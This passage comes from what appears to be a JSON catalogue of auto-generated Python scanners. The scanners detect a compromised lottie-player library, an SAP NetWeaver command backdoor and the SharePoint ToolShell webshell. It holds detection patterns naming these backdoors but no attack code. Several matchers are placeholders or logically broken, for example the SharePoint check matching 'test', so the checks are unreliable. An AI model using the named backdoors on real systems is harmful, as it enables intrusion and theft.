        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: lottie-backdoor\nName: Lottie Player - Backdoor\nSeverity: critical\nDescription: Detectes vulnerable compormised version of lottie-player JS Library that were compormised with a Web3 wallet pop-up backdoor.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_lottie_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"lottie-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"Lottie Player - Backdoor\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'lottie-player@2.0.5, lottie-player@2.0.6, lottie-player@2.0.7'\"\n\n        # Simple word matcher simulation\n        matchers = ['lottie-player@2.0.5, lottie-player@2.0.6, lottie-player@2.0.7']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Lottie Player - Backdoor\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_lottie_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: lottie-backdoor\nName: Lottie Player - Backdoor\nSeverity: critical\nDescription: Detectes vulnerable compormised version of lottie-player JS Library that were compormised with a Web3 wallet pop-up backdoor.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_lottie_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"lottie-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"Lottie Player - Backdoor\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'lottie-player@2.0.5, lottie-player@2.0.6, lottie-player@2.0.7'\"\n\n        # Simple word matcher simulation\n        matchers = ['lottie-player@2.0.5, lottie-player@2.0.6, lottie-player@2.0.7']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Lottie Player - Backdoor\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_lottie_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cdn",
          "lottie-player",
          "backdoor",
          "malware",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sap_netweaver_backdoor",
        "name": "SAP NetWeaver - Backdoor Detection",
        "language": "Python",
        "famille": "WebApp",
        "description": "Detected a potential backdoor in SAP NetWeaver allowing unauthorized command execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Command: ls<BR>, sap' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sap-netweaver-backdoor\nName: SAP NetWeaver - Backdoor Detection\nSeverity: critical\nDescription: Detected a potential backdoor in SAP NetWeaver allowing unauthorized command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sap_netweaver_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sap-netweaver-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"SAP NetWeaver - Backdoor Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Command: ls<BR>, sap' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Command: ls<BR>, sap']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SAP NetWeaver - Backdoor Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sap_netweaver_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sap-netweaver-backdoor\nName: SAP NetWeaver - Backdoor Detection\nSeverity: critical\nDescription: Detected a potential backdoor in SAP NetWeaver allowing unauthorized command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sap_netweaver_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sap-netweaver-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"SAP NetWeaver - Backdoor Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Command: ls<BR>, sap' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Command: ls<BR>, sap']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SAP NetWeaver - Backdoor Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sap_netweaver_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sap",
          "netweaver",
          "backdoor",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sharepoint_toolshell_backdoor",
        "name": "SharePoint Webshell - ToolShell",
        "language": "Python",
        "famille": "WebApp",
        "description": "Detects a persistent webshell named 'spinstall0.aspx' deployed on Microsoft SharePoint servers.\nThis file exposes sensitive cryptographic machineKey values from the SharePoint configuration,\nindicating the presence of a ToolShell backdoor implant. This implant is linked to targeted\npost-auth RCE campaigns exploiting CVE-2025-53770.",
        "severity": "critical",
        "detection": "[OR] DSL: len(body) <= 160; status_code == 200",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sharepoint-toolshell-backdoor\nName: SharePoint Webshell - ToolShell\nSeverity: critical\nDescription: Detects a persistent webshell named 'spinstall0.aspx' deployed on Microsoft SharePoint servers.\nThis file exposes sensitive cryptographic machineKey values from the SharePoint configuration,\nindicating the presence of a ToolShell backdoor implant. This implant is linked to targeted\npost-auth RCE campaigns exploiting CVE-2025-53770.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sharepoint_toolshell_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sharepoint-toolshell-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"SharePoint Webshell - ToolShell\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: len(body) <= 160; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SharePoint Webshell - ToolShell\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sharepoint_toolshell_backdoor(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sharepoint-toolshell-backdoor\nName: SharePoint Webshell - ToolShell\nSeverity: critical\nDescription: Detects a persistent webshell named 'spinstall0.aspx' deployed on Microsoft SharePoint servers.\nThis file exposes sensitive cryptographic machineKey values from the SharePoint configuration,\nindicating the presence of a ToolShell backdoor implant. This implant is linked to targeted\npost-auth RCE campaigns exploiting CVE-2025-53770.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sharepoint_toolshell_backdoor:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sharepoint-toolshell-backdoor\"\n    SEVERITY = \"critical\"\n    NAME = \"SharePoint Webshell - ToolShell\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                